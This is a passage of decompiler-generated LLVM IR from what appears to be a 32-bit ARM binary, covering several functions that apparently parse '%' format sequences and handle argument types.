  %v2_11410 = bitcast i32* %arg1 to i8*
  %v3_11410 = call i32 @function_11d70(i8* %v2_11410, i32 0)
  %v0_11414 = load i32, i32* @r4, align 4
  %v1_11414 = add i32 %v0_11414, 24
  %v2_11414 = inttoptr i32 %v1_11414 to i32*
  %v3_11414 = load i32, i32* %v2_11414, align 4
  %v1_11418 = add i32 %v3_11414, -1
  store i32 %v1_11418, i32* %v2_11414, align 4
  %v0_11420 = load i32, i32* @r5, align 4
  %v1_11420 = load i32, i32* @r4, align 4
  %v2_11420 = inttoptr i32 %v1_11420 to i32*
  store i32 %v0_11420, i32* %v2_11420, align 4
  %v0_11424 = load i32, i32* @r4, align 4
  %v1_11424 = add i32 %v0_11424, 40
  store i32 %v1_11424, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_1143419 = inttoptr i32 %v1_11424 to i32*
  store i32 8, i32* %v2_1143419, align 4
  %v3_1143420 = load i32, i32* %r1.global-to-local, align 4
  %v4_1143421 = add i32 %v3_1143420, 4
  store i32 %v4_1143421, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1142c.dec_label_pc_1142c_crit_edge

dec_label_pc_1142c.dec_label_pc_1142c_crit_edge:  ; preds = %dec_label_pc_113fc, %dec_label_pc_1142c.dec_label_pc_1142c_crit_edge
  %v4_1143422 = phi i32 [ %v4_1143421, %dec_label_pc_113fc ], [ %v4_11434, %dec_label_pc_1142c.dec_label_pc_1142c_crit_edge ]
  %v0_11430.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11430 = add i32 %v0_11430.pre, -1
  store i32 %v1_11430, i32* %r2.global-to-local, align 4
  %v7_11430 = icmp eq i32 %v0_11430.pre, 1
  %v2_11434 = inttoptr i32 %v4_1143422 to i32*
  store i32 8, i32* %v2_11434, align 4
  %v3_11434 = load i32, i32* %r1.global-to-local, align 4
  %v4_11434 = add i32 %v3_11434, 4
  store i32 %v4_11434, i32* %r1.global-to-local, align 4
  br i1 %v7_11430, label %dec_label_pc_1143c, label %dec_label_pc_1142c.dec_label_pc_1142c_crit_edge

dec_label_pc_1143c:                               ; preds = %dec_label_pc_1142c.dec_label_pc_1142c_crit_edge
  %v0_1143c = load i32, i32* @r5, align 4
  store i32 %v0_1143c, i32* %r2.global-to-local, align 4
  %v1_114803 = inttoptr i32 %v0_1143c to i8*
  %v2_114804 = load i8, i8* %v1_114803, align 1
  %v2_114846 = icmp eq i8 %v2_114804, 0
  br i1 %v2_114846, label %dec_label_pc_1148c, label %dec_label_pc_1144c

dec_label_pc_11444:                               ; preds = %dec_label_pc_11464
  %v2_11448 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11448, i32* @r4, align 4
  store i32 %v6_113fc, i32* @r5, align 4
  ret i32 -1

dec_label_pc_1144c:                               ; preds = %dec_label_pc_1143c, %dec_label_pc_11480.backedge
  %v0_11454 = phi i32 [ %storemerge, %dec_label_pc_11480.backedge ], [ %v0_1143c, %dec_label_pc_1143c ]
  %v2_114807 = phi i8 [ %v2_11480, %dec_label_pc_11480.backedge ], [ %v2_114804, %dec_label_pc_1143c ]
  %v7_1144c = icmp eq i8 %v2_114807, 37
  br i1 %v7_1144c, label %dec_label_pc_11454, label %dec_label_pc_1147c

dec_label_pc_11454:                               ; preds = %dec_label_pc_1144c
  %v1_11454 = add i32 %v0_11454, 1
  %v2_11454 = inttoptr i32 %v1_11454 to i8*
  %v3_11454 = load i8, i8* %v2_11454, align 1
  store i32 %v1_11454, i32* %r2.global-to-local, align 4
  %v7_11458 = icmp eq i8 %v3_11454, 37
  br i1 %v7_11458, label %dec_label_pc_1147c, label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %dec_label_pc_11454
  %v0_1145c = load i32, i32* @r4, align 4
  %v2_11464 = inttoptr i32 %v0_1145c to i32*
  store i32 %v1_11454, i32* %v2_11464, align 4
  %v2_11468 = call i32 @function_116b4(i32* %v2_11464)
  %v1_1146c = icmp slt i32 %v2_11468, 0
  br i1 %v1_1146c, label %dec_label_pc_11444, label %dec_label_pc_11474

dec_label_pc_11474:                               ; preds = %dec_label_pc_11464
  %v0_11474 = load i32, i32* @r4, align 4
  %v1_11474 = inttoptr i32 %v0_11474 to i32*
  %v2_11474 = load i32, i32* %v1_11474, align 4
  br label %dec_label_pc_11480.backedge

dec_label_pc_1147c:                               ; preds = %dec_label_pc_1144c, %dec_label_pc_11454
  %v0_1147c = phi i32 [ %v0_11454, %dec_label_pc_1144c ], [ %v1_11454, %dec_label_pc_11454 ]
  %v1_1147c = add i32 %v0_1147c, 1
  br label %dec_label_pc_11480.backedge

dec_label_pc_11480.backedge:                      ; preds = %dec_label_pc_1147c, %dec_label_pc_11474
  %storemerge = phi i32 [ %v1_1147c, %dec_label_pc_1147c ], [ %v2_11474, %dec_label_pc_11474 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_11480 = inttoptr i32 %storemerge to i8*
  %v2_11480 = load i8, i8* %v1_11480, align 1
  %v2_11484 = icmp eq i8 %v2_11480, 0
  br i1 %v2_11484, label %dec_label_pc_11480.dec_label_pc_1148c_crit_edge, label %dec_label_pc_1144c

dec_label_pc_11480.dec_label_pc_1148c_crit_edge:  ; preds = %dec_label_pc_11480.backedge
  %v0_1148c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1148c

dec_label_pc_1148c:                               ; preds = %dec_label_pc_11480.dec_label_pc_1148c_crit_edge, %dec_label_pc_1143c
  %v0_1148c = phi i32 [ %v0_1148c.pre, %dec_label_pc_11480.dec_label_pc_1148c_crit_edge ], [ %v0_1143c, %dec_label_pc_1143c ]
  %v3_11480.lcssa.in = phi i8 [ %v2_11480, %dec_label_pc_11480.dec_label_pc_1148c_crit_edge ], [ %v2_114804, %dec_label_pc_1143c ]
  %v3_11480.lcssa = zext i8 %v3_11480.lcssa.in to i32
  %v1_1148c = load i32, i32* @r4, align 4
  %v2_1148c = inttoptr i32 %v1_1148c to i32*
  store i32 %v0_1148c, i32* %v2_1148c, align 4
  %v2_11490 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11490, i32* @r4, align 4
  store i32 %v6_113fc, i32* @r5, align 4
  ret i32 %v3_11480.lcssa

; uselistorder directives
  uselistorder i8 %v2_11480, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1143c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11434, { 1, 0 }
  uselistorder i32 %v0_11430.pre, { 1, 0 }
  uselistorder i32 %v6_113fc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_1147c, { 1, 0 }
  uselistorder label %dec_label_pc_1144c, { 1, 0 }
  uselistorder label %dec_label_pc_1142c.dec_label_pc_1142c_crit_edge, { 1, 0 }
}

define i32 @function_11494(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11494:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11494 = load i32, i32* @r4, align 4
  store i32 %v3_11494, i32* %stack_var_-12, align 4
  %v1_11498 = add i32 %arg1, 24
  %v2_11498 = inttoptr i32 %v1_11498 to i32*
  %v3_11498 = load i32, i32* %v2_11498, align 4
  store i32 %v3_11498, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_114a8 = add i32 %arg1, 76
  %v3_114a8 = inttoptr i32 %v2_114a8 to i32*
  store i32 %arg2, i32* %v3_114a8, align 4
  %v7_114ac = icmp sgt i32 %v3_11498, 0
  br i1 %v7_114ac, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_11494
  %v10_114ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_114ac, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %dec_label_pc_11494
  %v0_114b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_114b0 = add i32 %arg1, 8
  %v3_114b0 = inttoptr i32 %v2_114b0 to i32*
  store i32 %v0_114b0, i32* %v3_114b0, align 4
  %v0_114b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_114b4 = add i32 %arg1, 28
  %v3_114b4 = inttoptr i32 %v2_114b4 to i32*
  store i32 %v0_114b4, i32* %v3_114b4, align 4
  %v0_114b8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_114b8, i32* %v2_11498, align 4
  %v0_114bc = load i32, i32* %r3.global-to-local, align 4
  %v2_114bc = add i32 %arg1, 4
  %v3_114bc = inttoptr i32 %v2_114bc to i32*
  store i32 %v0_114bc, i32* %v3_114bc, align 4
  %v0_114c0 = call i32 @function_114cc()
  %v0_114c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_114c4 = load i32, i32* @r4, align 4
  %v2_114c4 = add i32 %v1_114c4, 24
  %v3_114c4 = inttoptr i32 %v2_114c4 to i32*
  store i32 %v0_114c4, i32* %v3_114c4, align 4
  %v2_114c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_114c8, i32* @r4, align 4
  ret i32 %v0_114c0

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_114cc, { 1, 0 }
  uselistorder i32 %arg1, { 0, 5, 3, 6, 2, 1, 4, 7 }
}

define i32 @function_114cc() local_unnamed_addr {
dec_label_pc_114cc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_114cc = load i32, i32* @r0, align 4
  %v1_114cc = add i32 %v0_114cc, 24
  %v2_114cc = inttoptr i32 %v1_114cc to i32*
  %v3_114cc = load i32, i32* %v2_114cc, align 4
  store i32 %v3_114cc, i32* %r1.global-to-local, align 4
  %v2_114d0 = icmp eq i32 %v3_114cc, 0
  %v3_114d4 = load i32, i32* @r4, align 4
  store i32 %v3_114d4, i32* %stack_var_-8, align 4
  %v1_114d8 = add i32 %v0_114cc, 80
  store i32 %v1_114d8, i32* %ip.global-to-local, align 4
  %v1_114dc = add i32 %v0_114cc, 8
  %v2_114dc = inttoptr i32 %v1_114dc to i32*
  %v3_114dc = load i32, i32* %v2_114dc, align 4
  store i32 %v3_114dc, i32* %r3.global-to-local, align 4
  %v6_114e4 = icmp eq i32 %v3_114dc, -2147483648
  br i1 %v2_114d0, label %dec_label_pc_114e4, label %dec_label_pc_11608

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114cc
  br i1 %v6_114e4, label %dec_label_pc_114ec, label %dec_label_pc_11504

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114e4
  %v1_114ec = add i32 %v0_114cc, 76
  %v2_114ec = inttoptr i32 %v1_114ec to i32*
  %v3_114ec = load i32, i32* %v2_114ec, align 4
  store i32 %v3_114ec, i32* %r3.global-to-local, align 4
  %v1_114f0 = inttoptr i32 %v3_114ec to i32*
  %v2_114f0 = load i32, i32* %v1_114f0, align 4
  store i32 %v2_114f0, i32* %r2.global-to-local, align 4
  %v1_114f4 = add i32 %v3_114ec, 4
  store i32 %v1_114f4, i32* %r3.global-to-local, align 4
  store i32 %v1_114f4, i32* %v2_114ec, align 4
  %v0_114fc = load i32, i32* %r2.global-to-local, align 4
  %v1_114fc = load i32, i32* @r0, align 4
  %v2_114fc = add i32 %v1_114fc, 8
  %v3_114fc = inttoptr i32 %v2_114fc to i32*
  store i32 %v0_114fc, i32* %v3_114fc, align 4
  %v0_11500 = load i32, i32* %r2.global-to-local, align 4
  %v1_11500 = load i32, i32* @r0, align 4
  %v2_11500 = add i32 %v1_11500, 80
  %v3_11500 = inttoptr i32 %v2_11500 to i32*
  store i32 %v0_11500, i32* %v3_11500, align 4
  %v0_11504.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %dec_label_pc_114e4, %dec_label_pc_114ec
  %v1_1151c = phi i32 [ %v0_114cc, %dec_label_pc_114e4 ], [ %v0_11504.pre, %dec_label_pc_114ec ]
  %v1_11504 = add i32 %v1_1151c, 4
  %v2_11504 = inttoptr i32 %v1_11504 to i32*
  %v3_11504 = load i32, i32* %v2_11504, align 4
  store i32 %v3_11504, i32* %r3.global-to-local, align 4
  %v6_11508 = icmp eq i32 %v3_11504, -2147483648
  br i1 %v6_11508, label %dec_label_pc_11510, label %dec_label_pc_11528

dec_label_pc_11510:                               ; preds = %dec_label_pc_11504
  %v1_11510 = add i32 %v1_1151c, 76
  %v2_11510 = inttoptr i32 %v1_11510 to i32*
  %v3_11510 = load i32, i32* %v2_11510, align 4
  store i32 %v3_11510, i32* %r3.global-to-local, align 4
  %v1_11514 = inttoptr i32 %v3_11510 to i32*
  %v2_11514 = load i32, i32* %v1_11514, align 4
  store i32 %v2_11514, i32* %r2.global-to-local, align 4
  %v1_11518 = add i32 %v3_11510, 4
  store i32 %v1_11518, i32* %r3.global-to-local, align 4
  store i32 %v1_11518, i32* %v2_11510, align 4
  %v0_11520 = load i32, i32* %r2.global-to-local, align 4
  %v1_11520 = load i32, i32* @r0, align 4
  %v2_11520 = add i32 %v1_11520, 4
  %v3_11520 = inttoptr i32 %v2_11520 to i32*
  store i32 %v0_11520, i32* %v3_11520, align 4
  %v0_11524 = load i32, i32* %r2.global-to-local, align 4
  %v1_11524 = load i32, i32* @r0, align 4
  %v2_11524 = add i32 %v1_11524, 80
  %v3_11524 = inttoptr i32 %v2_11524 to i32*
  store i32 %v0_11524, i32* %v3_11524, align 4
  %v0_115f818.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11528

dec_label_pc_11528:                               ; preds = %dec_label_pc_11504, %dec_label_pc_11510
  %v0_115f818 = phi i32 [ %v1_1151c, %dec_label_pc_11504 ], [ %v0_115f818.pre, %dec_label_pc_11510 ]
  %v0_11528 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11528, i32* %lr.global-to-local, align 4
  %v1_115f819 = add i32 %v0_115f818, 28
  %v2_115f820 = inttoptr i32 %v1_115f819 to i32*
  %v3_115f821 = load i32, i32* %v2_115f820, align 4
  store i32 %v3_115f821, i32* %r3.global-to-local, align 4
  %v5_1160023 = icmp slt i32 %v0_11528, %v3_115f821
  br i1 %v5_1160023, label %dec_label_pc_11530, label %dec_label_pc_11604.loopexit

dec_label_pc_11530:                               ; preds = %dec_label_pc_11528, %dec_label_pc_115f4
  %v0_115f825 = phi i32 [ %v0_115f8, %dec_label_pc_115f4 ], [ %v0_115f818, %dec_label_pc_11528 ]
  %v1_1153024 = phi i32 [ %v1_115f4, %dec_label_pc_115f4 ], [ %v0_11528, %dec_label_pc_11528 ]
  %v4_11530 = mul i32 %v1_1153024, 4
  %v5_11530 = add i32 %v0_115f825, %v4_11530
  store i32 %v5_11530, i32* %r3.global-to-local, align 4
  %v1_11534 = add i32 %v5_11530, 40
  %v2_11534 = inttoptr i32 %v1_11534 to i32*
  %v3_11534 = load i32, i32* %v2_11534, align 4
  store i32 %v3_11534, i32* %r2.global-to-local, align 4
  %v7_11538 = icmp eq i32 %v3_11534, 8
  br i1 %v7_11538, label %dec_label_pc_115f4, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11530
  %v1_11540 = add i32 %v0_115f825, 76
  %v2_11540 = inttoptr i32 %v1_11540 to i32*
  %v3_11540 = load i32, i32* %v2_11540, align 4
  store i32 %v3_11540, i32* %r1.global-to-local, align 4
  %v8_11544 = icmp sgt i32 %v3_11534, 8
  br i1 %v8_11544, label %dec_label_pc_11568, label %dec_label_pc_11548

dec_label_pc_11548:                               ; preds = %dec_label_pc_11540
  %v7_11548 = icmp eq i32 %v3_11534, 2
  br i1 %v7_11548, label %dec_label_pc_115b4, label %dec_label_pc_11550

dec_label_pc_11550:                               ; preds = %dec_label_pc_11548
  %v8_11550 = icmp sgt i32 %v3_11534, 2
  br i1 %v8_11550, label %dec_label_pc_11560, label %dec_label_pc_11554

dec_label_pc_11554:                               ; preds = %dec_label_pc_11550
  %v1_11554 = icmp slt i32 %v3_11534, 0
  br i1 %v1_11554, label %dec_label_pc_115e0, label %dec_label_pc_115b4

dec_label_pc_11560:                               ; preds = %dec_label_pc_11550
  %v7_11560 = icmp eq i32 %v3_11534, 7
  br i1 %v7_11560, label %dec_label_pc_115c8, label %dec_label_pc_115e0

dec_label_pc_11568:                               ; preds = %dec_label_pc_11540
  %v7_11568 = icmp eq i32 %v3_11534, 1024
  br i1 %v7_11568, label %dec_label_pc_115b4, label %dec_label_pc_11570

dec_label_pc_11570:                               ; preds = %dec_label_pc_11568
  %v8_11570 = icmp sgt i32 %v3_11534, 1024
  br i1 %v8_11570, label %dec_label_pc_11588, label %dec_label_pc_11574

dec_label_pc_11574:                               ; preds = %dec_label_pc_11570
  switch i32 %v3_11534, label %dec_label_pc_115e0 [
    i32 256, label %dec_label_pc_115b4
    i32 512, label %dec_label_pc_115b4
  ]

dec_label_pc_11588:                               ; preds = %dec_label_pc_11570
  %v7_11588 = icmp eq i32 %v3_11534, 2048
  br i1 %v7_11588, label %dec_label_pc_115a0, label %dec_label_pc_11598

dec_label_pc_11598:                               ; preds = %dec_label_pc_11588
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_11594 = icmp eq i32 %v3_11534, 2055
  br i1 %v9_11594, label %dec_label_pc_115c8, label %dec_label_pc_115e0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11588
  %v1_115a0 = add i32 %v3_11540, 8
  store i32 %v1_115a0, i32* %r3.global-to-local, align 4
  store i32 %v1_115a0, i32* %v2_11540, align 4
  %v0_115a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_115a8 = inttoptr i32 %v0_115a8 to i32*
  %v2_115a8 = load i32, i32* %v1_115a8, align 4
  store i32 %v2_115a8, i32* %r3.global-to-local, align 4
  %v3_115a8 = add i32 %v0_115a8, 4
  %v4_115a8 = inttoptr i32 %v3_115a8 to i32*
  %v5_115a8 = load i32, i32* %v4_115a8, align 4
  store i32 %v5_115a8, i32* %r4.global-to-local, align 4
  %v0_115ac = load i32, i32* %ip.global-to-local, align 4
  %v1_115ac = inttoptr i32 %v0_115ac to i32*
  store i32 %v2_115a8, i32* %v1_115ac, align 4
  %v3_115ac = add i32 %v0_115ac, 4
  %v4_115ac = inttoptr i32 %v3_115ac to i32*
  %v5_115ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_115ac, i32* %v4_115ac, align 4
  br label %dec_label_pc_115f0

dec_label_pc_115b4:                               ; preds = %dec_label_pc_11574, %dec_label_pc_11574, %dec_label_pc_11554, %dec_label_pc_11568, %dec_label_pc_11548
  %v1_115b4 = inttoptr i32 %v3_11540 to i32*
  %v2_115b4 = load i32, i32* %v1_115b4, align 4
  store i32 %v2_115b4, i32* %r2.global-to-local, align 4
  %v1_115b8 = add i32 %v3_11540, 4
  store i32 %v1_115b8, i32* %r3.global-to-local, align 4
  store i32 %v1_115b8, i32* %v2_11540, align 4
  %v0_115c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_115c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_115c0 = inttoptr i32 %v1_115c0 to i32*
  store i32 %v0_115c0, i32* %v2_115c0, align 4
  br label %dec_label_pc_115f0

dec_label_pc_115c8:                               ; preds = %dec_label_pc_11560, %dec_label_pc_11598
  %v3_115c8 = load i32, i32* %v2_11540, align 4
  store i32 %v3_115c8, i32* %r2.global-to-local, align 4
  %v1_115cc = add i32 %v3_115c8, 8
  store i32 %v1_115cc, i32* %r3.global-to-local, align 4
  store i32 %v1_115cc, i32* %v2_11540, align 4
  %v0_115d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_115d4 = inttoptr i32 %v0_115d4 to i32*
  %v2_115d4 = load i32, i32* %v1_115d4, align 4
  store i32 %v2_115d4, i32* %r3.global-to-local, align 4
  %v3_115d4 = add i32 %v0_115d4, 4
  %v4_115d4 = inttoptr i32 %v3_115d4 to i32*
  %v5_115d4 = load i32, i32* %v4_115d4, align 4
  store i32 %v5_115d4, i32* %r4.global-to-local, align 4
  %v0_115d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_115d8 = inttoptr i32 %v0_115d8 to i32*
  store i32 %v2_115d4, i32* %v1_115d8, align 4
  %v3_115d8 = add i32 %v0_115d8, 4
  %v4_115d8 = inttoptr i32 %v3_115d8 to i32*
  %v5_115d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_115d8, i32* %v4_115d8, align 4
  br label %dec_label_pc_115f0

dec_label_pc_115e0:                               ; preds = %dec_label_pc_11574, %dec_label_pc_11560, %dec_label_pc_11554, %dec_label_pc_11598
  %v1_115e0 = add i32 %v3_11540, 4
  store i32 %v1_115e0, i32* %r3.global-to-local, align 4
  store i32 %v1_115e0, i32* %v2_11540, align 4
  %v0_115e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_115e8 = inttoptr i32 %v0_115e8 to i32*
  %v2_115e8 = load i32, i32* %v1_115e8, align 4
  store i32 %v2_115e8, i32* %r3.global-to-local, align 4
  %v1_115ec = load i32, i32* %ip.global-to-local, align 4
  %v2_115ec = inttoptr i32 %v1_115ec to i32*
  store i32 %v2_115e8, i32* %v2_115ec, align 4
  br label %dec_label_pc_115f0

dec_label_pc_115f0:                               ; preds = %dec_label_pc_115c8, %dec_label_pc_115b4, %dec_label_pc_115a0, %dec_label_pc_115e0
  %v0_115f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_115f0 = add i32 %v0_115f0, 8
  store i32 %v1_115f0, i32* %ip.global-to-local, align 4
  %v0_115f4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_115f8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %dec_label_pc_11530, %dec_label_pc_115f0
  %v0_115f8 = phi i32 [ %v0_115f825, %dec_label_pc_11530 ], [ %v0_115f8.pre, %dec_label_pc_115f0 ]
  %v0_115f4 = phi i32 [ %v1_1153024, %dec_label_pc_11530 ], [ %v0_115f4.pre, %dec_label_pc_115f0 ]
  %v1_115f4 = add i32 %v0_115f4, 1
  store i32 %v1_115f4, i32* %lr.global-to-local, align 4
  %v1_115f8 = add i32 %v0_115f8, 28
  %v2_115f8 = inttoptr i32 %v1_115f8 to i32*
  %v3_115f8 = load i32, i32* %v2_115f8, align 4
  store i32 %v3_115f8, i32* %r3.global-to-local, align 4
  %v5_11600 = icmp slt i32 %v1_115f4, %v3_115f8
  br i1 %v5_11600, label %dec_label_pc_11530, label %dec_label_pc_115f8.dec_label_pc_11604.loopexit_crit_edge

dec_label_pc_11608:                               ; preds = %dec_label_pc_114cc
  br i1 %v6_114e4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11608
  %v2_1160c = add i32 %v0_114cc, 36
  %v3_1160c = inttoptr i32 %v2_1160c to i8*
  %v4_1160c = load i8, i8* %v3_1160c, align 1
  %v5_1160c = zext i8 %v4_1160c to i32
  %v5_11610 = mul nuw nsw i32 %v5_1160c, 8
  %v6_11610 = add i32 %v5_11610, %v1_114d8
  store i32 %v6_11610, i32* %r3.global-to-local, align 4
  %v2_11614 = add i32 %v6_11610, -8
  %v3_11614 = inttoptr i32 %v2_11614 to i32*
  %v4_11614 = load i32, i32* %v3_11614, align 4
  store i32 %v4_11614, i32* %r3.global-to-local, align 4
  store i32 %v4_11614, i32* %v2_114dc, align 4
  %v0_1161c.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11608, %bb
  %v2_11630 = phi i32 [ %v0_1161c.pre, %bb ], [ %v0_114cc, %dec_label_pc_11608 ]
  %v1_1161c = add i32 %v2_11630, 4
  %v2_1161c = inttoptr i32 %v1_1161c to i32*
  %v3_1161c = load i32, i32* %v2_1161c, align 4
  store i32 %v3_1161c, i32* %r3.global-to-local, align 4
  %v6_11620 = icmp eq i32 %v3_1161c, -2147483648
  br i1 %v6_11620, label %bb15, label %dec_label_pc_11604

bb15:                                             ; preds = %.thread2
  %v2_11624 = add i32 %v2_11630, 37
  %v3_11624 = inttoptr i32 %v2_11624 to i8*
  %v4_11624 = load i8, i8* %v3_11624, align 1
  %v5_11624 = zext i8 %v4_11624 to i32
  %v1_11628 = load i32, i32* %ip.global-to-local, align 4
  %v5_11628 = mul nuw nsw i32 %v5_11624, 8
  %v6_11628 = add i32 %v5_11628, %v1_11628
  store i32 %v6_11628, i32* %r3.global-to-local, align 4
  %v2_1162c = add i32 %v6_11628, -8
  %v3_1162c = inttoptr i32 %v2_1162c to i32*
  %v4_1162c = load i32, i32* %v3_1162c, align 4
  store i32 %v4_1162c, i32* %r3.global-to-local, align 4
  store i32 %v4_1162c, i32* %v2_1161c, align 4
  %v0_11634.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11604

dec_label_pc_115f8.dec_label_pc_11604.loopexit_crit_edge: ; preds = %dec_label_pc_115f4
  br label %dec_label_pc_11604.loopexit

dec_label_pc_11604.loopexit:                      ; preds = %dec_label_pc_115f8.dec_label_pc_11604.loopexit_crit_edge, %dec_label_pc_11528
  %v0_115f8.lcssa = phi i32 [ %v0_115f8, %dec_label_pc_115f8.dec_label_pc_11604.loopexit_crit_edge ], [ %v0_115f818, %dec_label_pc_11528 ]
  br label %dec_label_pc_11604

dec_label_pc_11604:                               ; preds = %dec_label_pc_11604.loopexit, %.thread2, %bb15
  %v1_11654 = phi i32 [ %v0_115f8.lcssa, %dec_label_pc_11604.loopexit ], [ %v2_11630, %.thread2 ], [ %v0_11634.pre, %bb15 ]
  %v1_11634 = add i32 %v1_11654, 8
  %v2_11634 = inttoptr i32 %v1_11634 to i32*
  %v3_11634 = load i32, i32* %v2_11634, align 4
  store i32 %v3_11634, i32* %r1.global-to-local, align 4
  %v1_11638 = icmp slt i32 %v3_11634, 0
  br i1 %v1_11638, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_11604
  %v5_1163c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_1163c, i32* @r4, align 4
  ret i32 %v1_11654

bb17:                                             ; preds = %dec_label_pc_11604
  %v1_11640 = add i32 %v1_11654, 16
  %v2_11640 = inttoptr i32 %v1_11640 to i32*
  %v3_11640 = load i32, i32* %v2_11640, align 4
  %v1_11648 = sub i32 0, %v3_11634
  store i32 %v1_11648, i32* %r1.global-to-local, align 4
  %v1_11644 = and i32 %v3_11640, -10
  %v1_1164c = or i32 %v1_11644, 8
  store i32 %v1_1164c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_11654 = add i32 %v1_11654, 20
  %v3_11654 = inttoptr i32 %v2_11654 to i32*
  store i32 32, i32* %v3_11654, align 4
  %v0_11658 = load i32, i32* %r1.global-to-local, align 4
  %v1_11658 = load i32, i32* @r0, align 4
  %v2_11658 = add i32 %v1_11658, 8
  %v3_11658 = inttoptr i32 %v2_11658 to i32*
  store i32 %v0_11658, i32* %v3_11658, align 4
  %v0_1165c = load i32, i32* %r3.global-to-local, align 4
  %v1_1165c = load i32, i32* @r0, align 4
  %v2_1165c = add i32 %v1_1165c, 16
  %v3_1165c = inttoptr i32 %v2_1165c to i32*
  store i32 %v0_1165c, i32* %v3_1165c, align 4
  %v2_11660 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11660, i32* @r4, align 4
  %v8_11660 = load i32, i32* @r0, align 4
  ret i32 %v8_11660

; uselistorder directives
  uselistorder i32 %v1_115f4, { 2, 1, 0 }
  uselistorder i32 %v0_115f8, { 1, 2, 0 }
  uselistorder i32 %v3_11540, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_11540, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_11534, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_1153024, { 1, 0 }
  uselistorder i32 %v0_115f818, { 2, 0, 1 }
  uselistorder i32 %v0_114cc, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 37, { 1, 0 }
  uselistorder label %dec_label_pc_11604, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_115f4, { 1, 0 }
  uselistorder label %dec_label_pc_115f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_115e0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_115c8, { 1, 0 }
  uselistorder label %dec_label_pc_115b4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11530, { 1, 0 }
  uselistorder label %dec_label_pc_11528, { 1, 0 }
  uselistorder label %dec_label_pc_11504, { 1, 0 }
}

define i32 @function_11668() local_unnamed_addr {
dec_label_pc_11668:
  %v1_11680.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11688, %dec_label_pc_11668
  %v0_1166c = phi i32 [ %v1_1166c, %dec_label_pc_11688 ], [ ptrtoint (i32* @global_var_175ec.261 to i32), %dec_label_pc_11668 ]
  %v1_1166c = add i32 %v0_1166c, -2
  %v1_11670 = add i32 %v0_1166c, -1
